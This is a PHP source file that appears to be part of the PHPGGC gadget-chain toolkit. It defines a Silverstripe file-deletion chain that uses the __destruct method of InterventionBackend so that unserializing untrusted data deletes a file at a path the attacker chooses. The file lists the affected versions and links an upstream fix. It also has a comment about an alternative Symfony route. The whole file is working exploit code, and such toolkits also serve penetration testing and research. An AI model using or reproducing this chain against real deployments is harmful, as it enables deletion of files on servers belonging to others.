<?php

namespace GadgetChain\Silverstripe;

class FD1 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '3.5.5 <= 5.3.0+';
    public static $vector = '__destruct';
    public static $author = 'mcdruid';
    public static $information = 'https://github.com/silverstripe/silverstripe-assets/pull/664';

    // In some versions of Silverstripe you could also achieve File Deletion via
    // \Symfony\Component\HttpFoundation\Session\Storage\MockFileSessionStorage::destroy
    // called from the same destructor by $this->image->destroy();
    // However Symfony hardcodes a .mocksess suffix on the path which makes this
    // not particularly useful.

    public function generate(array $parameters)
    {
        return new \SilverStripe\Assets\InterventionBackend($parameters['remote_path']);
    }
}
